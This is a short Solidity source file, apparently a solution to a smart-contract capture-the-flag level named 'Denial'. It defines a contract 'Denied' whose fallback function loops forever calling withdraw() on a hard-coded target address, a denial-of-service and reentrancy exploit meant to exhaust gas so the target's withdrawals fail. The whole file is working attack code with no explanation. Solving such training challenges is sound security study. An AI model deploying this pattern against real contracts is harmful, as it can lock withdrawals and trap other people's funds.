// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Denial {
  function setWithdrawPartner(address) external;
  function withdraw() external;
}

contract Denied {
  address TARGET = 0x8E6a438e05a64DFB1E5eDFa185E9Fd2b218d6DA1;

  fallback() external payable {
    while(true) {
      Denial(TARGET).withdraw();
    }
  }
}